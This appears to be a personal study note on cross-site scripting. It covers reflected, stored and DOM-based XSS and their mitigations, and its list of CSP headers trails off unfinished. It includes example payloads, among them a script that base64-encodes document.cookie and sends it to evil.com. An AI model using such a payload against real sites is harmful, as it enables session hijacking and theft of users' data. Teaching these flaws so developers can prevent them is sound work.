#what is it?
Cross site scripting is an extremely common web vulnerability that allows an attacker to inject JavaScript into websites that will run under the context of the users browser, its effects can range from not too devestating all the way upto full webapp compromise if chained with something else some of its effects are

- defacement
- Session hijacking
- Privilege escalation 
- Key logging
- Data theft
- And more


XSS arises out the same issue that starts a lot of vulnerabilities, Trusting user input too much and not satanising  or validating it

An example of it could be when a website lets you enter a name for registration then on the dashboard types back

“Hello <name>”, if user input is trusted and there’s no sanatising, validation or encoding done when it’s reflected an attacker can make their name

<script>alert(“hacked”)</script>

Now when the website returns their “name” in the response the web browser thinks it’s valid JavaScript and will execute it leading to an alert box popping up on the screen, this may seem harmless but now imagine if the JavaScript runs every time the attackers name pops up in a comment section or user search’s and instead of an alert it’s something like

<script>fetch(“https://evil.com/?cookie=“ + btoa(document.cookie))</script>, now the attacker can steal peoples cookies and hinack their session, not good


- [ ] # types of XSS  

- [ ] Reflected:
- [ ] reflected xss is the most simple, and usually has the least amount of impact, it arises when user supplied data is directly reflected back into the response leading to JavaScript execution, it’s the least dangerous form as it requires the attacker to trick the user into the click with the payload injected, this must be a GET request like
- [ ] GET https://site.com/sayhi?name=<payload>
- [ ] As reflected XSS via post requests can’t be sent to victims like GET payloads can

- [ ] Stored: 
- [ ] stored XSS is one of the most dangerous forms as it causes the payload to be ran by everyone just by viewing the page that has it injected, it arises when a webapp takes user supplied data and stores it in a database and then grabs it whenever a user views the page and returns the payload into the reponse with no encoding or sanitisation
- [ ] Imagine a comment section that’s vulnerable to xss, if an attacker can inject JavaScript, anytime any user visits that comment section the payload will be pulled and executed in the user browser, if the httpOnly flag isn’t set on the cookie an attack can steal it and compromise that users session, this is particularly devastating if the victim is an admin

- [ ] DOM
- [ ] DOM based xss is a less common form of XSS and its purely client side, the injected payload never reaches the server, it arises when the web application takes user input and directly updates a DOM element to include the payload, for example imagine a URL like so
- [ ] site.com/details?back=/dashboard
- [ ] There’s also JavaScript int the background that retrieves that parameter and appends it to href element, if there’s no protections an attacker could do
- [ ] back=javascript:alert(1), the JS engine will see this as valid JavaScript and execute it

- [ ] # Mitigations
- [ ] There multiple ways to mitigate XSS but the main ones are
- [ ] Sanitisation: all user input no matter what should be sanitised, this involves removing all potentially malicious characters such as < > : unless required, all user input when being sent back to the user should be encoded to whatever spec required(url, html etc)
- [ ] WAFs: while not a core mitigation to stop the vulnerability from arising, WAFs help protect you against common xss payloads, this should NOT be your main defense as bypasses exist and are constantly found
- [ ] Secure cookies: this one also doesn’t stop the vulnerability from arising but it helps mitigate some affects of the vulnerability, all cookies when set should include the HttpOnly flag, this stops client side JavaScript from retrieving them, this helps protect against session theft 
- [ ] CSP: Content Security Policy is a browser enforced security, the way it works is that the webserver can return some headers that define where JavaScript can execute from, block inline JavaScript from running and more, your webserver should return headers such as
- [ ] Secure coding practices: security should be a priority through all stages of the development process, SAST should be in use
- [ ] 
